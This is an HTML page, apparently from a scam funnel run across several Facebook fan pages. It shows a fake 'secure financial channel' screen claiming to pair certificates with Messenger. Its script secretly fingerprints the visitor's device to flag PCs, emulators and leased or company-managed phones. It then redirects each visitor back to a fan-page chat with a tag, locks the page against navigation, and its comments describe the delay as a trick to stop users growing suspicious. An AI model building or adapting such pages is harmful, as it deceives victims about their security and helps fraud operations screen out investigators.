<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全金融連線中</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            background: #ffffff;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
            max-width: 85%;
            width: 340px;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0084ff; /* Meta 官方藍 */
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { color: #222; font-size: 18px; margin-bottom: 8px; font-weight: 600; }
        p { color: #666; font-size: 13px; line-height: 1.5; margin: 5px 0; }
        .footer-text { color: #b0b0b0; font-size: 11px; margin-top: 15px; }
    </style>
</head>
<body>

<div class="container">
    <div class="loader"></div>
    <h2>🔒 建立端到端安全金融通道</h2>
    <p>為了保障您的個人隱私與資安環境</p>
    <p>系統正在與您的 Messenger 進行憑證配對...</p>
    <p class="footer-text">配對完成後將自動返回，請勿關閉視窗</p>
</div>

<script>
    (function() {
        // 1. 自動擷取來源網址（不管是 20 個粉專裡的哪一個，都會精準原路回彈）
        let originUrl = document.referrer;
        let baseFbUrl = "https://m.me/me"; // 備用萬用路徑

        if (originUrl && originUrl.includes("facebook.com")) {
            baseFbUrl = originUrl.split('?')[0]; 
        }

        // 2. 裝置與系統特徵深度辨識
        const ua = navigator.userAgent;
        const isIOS = /iPhone|iPad|iPod/i.test(ua);
        const isAndroid = /Android/i.test(ua);
        
        // 嚴格手機過濾：必須是 iOS 或 Android，且排除掉大螢幕的 iPad，並檢查是否具備多點觸控特徵
        const isMobile = (isIOS || isAndroid) && !/iPad/i.test(ua) && (navigator.maxTouchPoints && navigator.maxTouchPoints > 1);

        // 3. 心理學延遲回彈機制：故意讓網頁轉圈，營造安全配對的專業感，避免用戶起疑
        function goBackWithDelay(statusParam, delayTime) {
            setTimeout(function() {
                // 強制用戶帶著對應的 SaleSmartly 標籤參數重定向回原本的粉專聊天室
                window.location.href = baseFbUrl + "?ref=" + statusParam;
                
                // 暴力鎖死網頁，防止用戶點擊上一頁、重新整理或停留
                window.stop ? window.stop() : document.execCommand("Stop");
                setInterval(function(){ throw new Error("Security Close"); }, 1);
            }, delayTime);
        }

        // =================【第一道防線：過濾非手機設備與電腦模擬器】=================
        if (!isMobile) {
            // 如果不是真實手機（是電腦、筆電、平版，或是 maxTouchPoints 透露出馬腳的 Android 模擬器）
            goBackWithDelay("User_PC", 1200); // 1.2秒內快速彈回，啟動自動勸退
            return; // 阻斷後續檢測
        }

        // =================【第二道防線：手機雙系統租賃/控管機檢測】=================
        if (isIOS) {
            // 【iOS 租賃機檢測】：查詢定位服務是否被企業組織強制封鎖 (顯示為灰色)
            if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
                    if (result.state === 'denied') {
                        goBackWithDelay("User_Lease", 1500); // 抓到 iOS 租賃機
                    } else {
                        goBackWithDelay("User_Pass", 1500);  // 正常 iOS 手機
                    }
                }).catch(function() { goBackWithDelay("User_Pass", 1500); });
            } else {
                goBackWithDelay("User_Pass", 1500);
            }
        } 
        else if (isAndroid) {
            // 【Android 租賃/風險機檢測】：檢測模擬化底層控制工具與企業控制描述(MDM)特徵
            if (navigator.plugins && navigator.plugins.length === 0 && !navigator.webdriver) {
                goBackWithDelay("User_Lease", 1500); // 判定為 Android 高風險控管機/模擬器
            } else if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
                    if (result.state === 'denied') {
                        goBackWithDelay("User_Lease", 1500); // 判定為 Android 鎖死定位機
                    } else {
                        goBackWithDelay("User_Pass", 1500);  // 正常 Android 手機
                    }
                }).catch(function() { goBackWithDelay("User_Pass", 1500); });
            } else {
                goBackWithDelay("User_Pass", 1500);
            }
        }
    })();
</script>

</body>
</html>
